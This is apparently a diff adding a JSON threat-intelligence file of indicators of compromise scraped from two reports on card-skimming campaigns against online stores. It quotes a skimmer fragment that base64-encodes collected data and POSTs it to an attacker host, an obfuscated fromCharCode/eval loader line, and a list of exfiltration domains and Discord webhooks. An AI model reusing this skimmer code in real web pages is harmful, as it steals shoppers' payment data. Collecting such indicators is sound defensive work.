@@ -1,0 +1,113 @@
+[
+    {
+        "url": "https://sansec.io/research/convertr-plausible-supply-chain-attack",
+        "date": "2026-10-26",
+        "title": "",
+        "feedText": "",
+        "indicators": [
+            {
+                "kind": "code",
+                "text": "analytics.convertr.app.br",
+                "context": "analytics.convertr.app.br"
+            },
+            {
+                "kind": "code",
+                "text": "var raw = D.c + \"|\" + D.m + \"|\" + D.y + \"|\" + D.v + \"|\" + (D.p || \"\") + \"|\" + (D.n || \"\") + \"|ctr\";\nfetch(\"https://1x0.is/ws\", {\n  method: \"POST\",\n  body: btoa(unescape(encodeURIComponent(raw))),\n  mode: \"no-cors\",\n  keepalive: true,\n});",
+                "context": "var raw = D.c + \"|\" + D.m + \"|\" + D.y + \"|\" + D.v + \"|\" + (D.p || \"\") + \"|\" + (D.n || \"\") + \"|ctr\"; fetch(\"https://1x0.is/ws\", { method: \"POST\", body: btoa(unes"
+            },
+            {
+                "kind": "code",
+                "text": "# Exfiltration\nhttps://1x0.is/ws\nhttps://1x0.is/ws/<base64>\n\n# Infected file, sha256 on 26 October\nhttps://analytics.convertr.app.br/js/script.pageview-props.tagged-events.js\nee4618d24737eff785e5a267b55903d5ef6ff7ecbeb099347a67fee77734d7f7\n\n# Skimmer strings\nindexOf('checkout.convertr')\n_s+=String.fromCharCode(_a[_i]);(0,eval)(_s)\n\n# Earlier exfiltration domains of the same group\nsnf.is\nkk.land\nnmn.is\nkof.one\nanl.is\nxsox.diy\neqp.is\nshy.is\nblz.is\ntray.is\nmiorl.net\nxwv.is\nfasthook.app\nantiddos-protection.net\n\n# Discord webhooks used for exfiltration, by webhook ID\ndiscord.com/api/webhooks/134931",
+                "context": "# Exfiltration https://1x0.is/ws https://1x0.is/ws/<base64> # Infected file, sha256 on 26 October https://analytics.convertr.app.br/js/script.pageview-props.tag"
+            },
+            {
+                "kind": "base64",
+                "text": "ee4618d24737eff785e5a267b55903d5ef6ff7ecbeb099347a67fee77734d7f7",
+                "context": "ee4618d24737eff785e5a267b55903d5ef6ff7ecbeb099347a67fee77734d7f7"
+            },
+            {
+                "kind": "domain",
+                "text": "analytics.convertr.app.br",
+                "context": "analytics.convertr.app.br"
+            },
+            {
+                "kind": "domain",
+                "text": "pagar.me",
+                "context": "Pagar.me"
+            },
+            {
+                "kind": "domain",
+                "text": "miorl.net",
+                "context": "miorl.net"
+            },
+            {
+                "kind": "domain",
+                "text": "fasthook.app",
+                "context": "fasthook.app"
+            },
+            {
+                "kind": "domain",
+                "text": "antiddos-protection.net",
+                "context": "antiddos-protection.net"
+            },
+            {
+                "kind": "domain",
+                "text": "discord.com",
+                "context": "discord.com"
+            },
+            {
+                "kind": "domain",
+                "text": "checkoutsdeepveindrilling.com",
+                "context": "checkoutsdeepveindrilling.com"
+            },
+            {
+                "kind": "file",
+                "text": "cartao.php",
+                "context": "cartao.php"
+            },
+            {
+                "kind": "file",
+                "text": "pagamento.php",
+                "context": "pagamento.php"
+            },
+            {
+                "kind": "file",
+                "text": "tagged-events.js",
+                "context": "tagged-events.js"
+            },
+            {
+                "kind": "call",
+                "text": "btoa(",
+                "context": "tr\"; fetch(\"https://1x0.is/ws\", { method: \"POST\", body: btoa(unescape(encodeURIComponent(raw))), mode: \"no-cors\", keepalive: true, }); The attacker upda"
+            },
+            {
+                "kind": "call",
+                "text": "fromCharCode(",
+                "context": " # Skimmer strings indexOf('checkout.convertr') _s+=String.fromCharCode(_a[_i]);(0,eval)(_s) # Earlier exfiltration domains of the same group snf.is kk.land n"
+            }
+        ]
+    },
+    {
+        "url": "https://thehackernews.com/2026/10/hackers-infect-953-online-stores-with.html",
+        "date": "2026-10-26",
+        "title": "Hackers Infect 953 Online Stores With Scanner-Evading JavaScript, Mostly on Magento",
+        "feedText": "An unknown threat actor has infected 953 online stores, most of them running Magento, as part of a long-running campaign active since July 2025.\n\nAccording to Dutch e-commerce security company Sansec, the activity is designed to add a small piece of code to the store's pages that, when visited by unsuspecting users, serves malicious JavaScript loader code through Magento CMS blocks.\n\n\"When you",
+        "indicators": [
+            {
+                "kind": "domain",
+                "text": "additionalver.com",
+                "context": "additionalver.com"
+            },
+            {
+                "kind": "file",
+                "text": "Node.js",
+                "context": "Node.js"
+            },
+            {
+                "kind": "call",
+                "text": "system (",
+                "context": "g tracker and analytics platform, as a traffic distribution system (TDS), to route visitors to different responses \u2013 i.e., return a payload, a redirect or not"
+            }
+        ]
+    }
+]
